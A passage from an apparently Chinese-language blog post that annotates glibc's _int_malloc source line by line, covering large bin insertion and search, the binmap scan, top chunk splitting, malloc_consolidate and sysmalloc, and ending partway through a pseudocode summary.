*/</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">        <span class="comment">//bck-&gt;bk指向的是该bin中最小的chunk</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//如果这个chunk的大小比所有的chunk都要小</span></span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"><span class="comment">//将其链入最后</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//否则则挑一个合适的地方进行链入</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size <span class="comment">//如果刚刚好有个相同大小的chunk链，则会放进相同chunk链的链表</span></span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//否则将chunk链入新的位置</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">              malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//为空则设置victim的fd_nextsize和bk_nextsize都为自己</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后将victim链入对应的bin中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>之后是一些tcache bin的操作，tcache_unsorted_count自增，如果return_cached不为零，并且满足一些条件后，则从tcache中寻找chunk并返还。</p><p>如果循环次数足够多了，就退出这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">filling the cache, return one of the cached ones.  */</span></span><br><span class="line">  ++tcache_unsorted_count;</span><br><span class="line">  <span class="keyword">if</span> (return_cached</span><br><span class="line">&amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> <span class="comment">//mp_.tcache_unsorted_limit是被从初始化为0的</span></span><br><span class="line">&amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h6 id="真正的large-bin搜索阶段"><a href="#真正的large-bin搜索阶段" class="headerlink" title="真正的large bin搜索阶段"></a>真正的large bin搜索阶段</h6><p>如果unsorted bin中也搜不到的话，之后便是在large bin中搜索的过程。这个也位于那个<code>for(;;)</code>的大循环当中。这个和之前那个<code>unsorted bin</code>中的过程有点类似。但是之前那个是将unsorted bin中的chunk取出放进large bin中(如果大小合适的话)，而这里是从large bin中取合适的chunk，可能涉及到chunk的切割操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果bin为空或者bin中的chunk都太小，则跳过</span></span><br><span class="line">  <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">&amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">  &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      victim = victim-&gt;bk_nextsize;</span><br><span class="line">      <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//找到一个大小合适的chunksize，也就是第一个大于等于nb的chunk</span></span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">          list does not have to be rerouted.  */</span></span><br><span class="line">      <span class="comment">//这里判断了选取的victim是否是bin中最后一个(也就是最小的)，并且同一个chunk链的两个chunk大小相同</span></span><br><span class="line">      <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">&amp;&amp; chunksize_nomask (victim)</span><br><span class="line">== chunksize_nomask (victim-&gt;fd))</span><br><span class="line">        victim = victim-&gt;fd;</span><br><span class="line"><span class="comment">//把victim取下，进行切割</span></span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      unlink_chunk (av, victim);</span><br><span class="line"><span class="comment">//如果切下来之后剩余块过小，则不进行分割，直接返还给用户(所以会有冗余)</span></span><br><span class="line">      <span class="comment">/* Exhaust */</span></span><br><span class="line">      <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">//否则进行分割，然后放入unsorted bin中</span></span><br><span class="line">      <span class="comment">/* Split */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">              have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">          <span class="comment">//这些就是把分割后的remainder链入unsorted bin的过程</span></span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">              remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="进一步的large-bin搜索与top-chunk环节"><a href="#进一步的large-bin搜索与top-chunk环节" class="headerlink" title="进一步的large bin搜索与top chunk环节"></a>进一步的large bin搜索与top chunk<strong>环节</strong></h6><p>如果在大小适合的large bin中还没有找到的话，则去下一个更大的链表中去查找然后切割，如果还是没有就去top chunk那去切割</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//如果搜完了还是没有，就去top chunk</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">    <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//找到了合适的bin，然后取victim</span></span><br><span class="line">    <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">    victim = last (bin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">    <span class="comment">//victim==bin，意味着这个bin为空</span></span><br><span class="line">    <span class="keyword">if</span> (victim == bin)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//如果不为空，则直接取。由于我们是从更大的large bin中去取得，所以大小不出意外的话是没问题的，这里还是做了一个size&gt;=nb得判断</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"><span class="comment">//类似刚刚的large bin操作，是一个取出然后切割的过程</span></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">          &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果遍历完了还是没有，则会去top chunk那去取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//如果搜完了还是没有，就去top chunk</span></span><br><span class="line"><span class="keyword">goto</span> use_top;</span><br></pre></td></tr></table></figure><p>去top chunk取的分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">      (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">      search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">      less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">      be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">      limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">      MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">      exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">      reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">      to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">      here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的过程很清楚，首先判断top chunk的大小是否足够，如果足够那么直接切割</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果不够的话，并且存有fastchunk，那么就会调用<code>malloc_consolidate</code>进行一个chunk合并的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">    here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>否则的话，就需要调用sysmalloc进行分配了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是<code>_int_malloc</code>的全部流程。概括来说是这样的(感觉我这个写法也是没谁了2333，能理解就行)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_int_malloc</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(请求的大小比满足fastbin范围)</span><br><span class="line">    &#123;</span><br><span class="line">        去fastbin中找</span><br><span class="line">        <span 